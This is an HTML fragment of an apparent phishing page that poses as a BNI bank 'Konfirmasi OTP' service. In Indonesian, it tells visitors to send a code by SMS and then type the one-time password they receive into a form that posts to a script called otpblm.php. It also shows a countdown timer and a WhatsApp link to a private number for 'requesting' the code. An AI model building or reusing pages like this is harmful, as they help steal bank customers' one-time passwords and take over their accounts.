...
<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">Konfirmasi OTP </a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	<div class="container container-margin"> 		<form id="form" action="auth/otpblm.php" method="POST"> 			<input type="hidden" name="input" value="input" /> 			<div class="panel panel-default"> 			 	<div class="panel-body"> 					<div class="row"> 						<div class="col-md-12"> 						
<center>
<img src="img/bni.png" width="60%">
<br>
<h4>
Silahkan salin format dari customer service lalu kirim ke 3346,<br>
<br>
Setelah itu masukkan kode otp yang di kirim via sms/whatsapp</h4>

Detik : <span id="waktu">00</span>
<script type="text/javascript"> 
var  waktu = 60; 
setInterval(function() { waktu--; if(waktu < 0) {}
else{ document.getElementById("waktu").innerHTML = waktu; } }, 1000); </script>
</center>
<br>

<div class="form-group">
<label>KODE OTP</label> 								<input class="form-control" type="number" name="no" value="" autocomplete="off" required /> 							</div> 						

	</select>
	<center> 
	<a style="font-weight:bold;color:#005E6A;" target="_blank" rel="noreferrer noopener"
href="https://api.whatsapp.com/send?phone=62816245319&text=">>> Request Kode OTP ? <<</a>		
</center>			
<br>
<div class="row"> 				
<div class="col-md-12"> 	
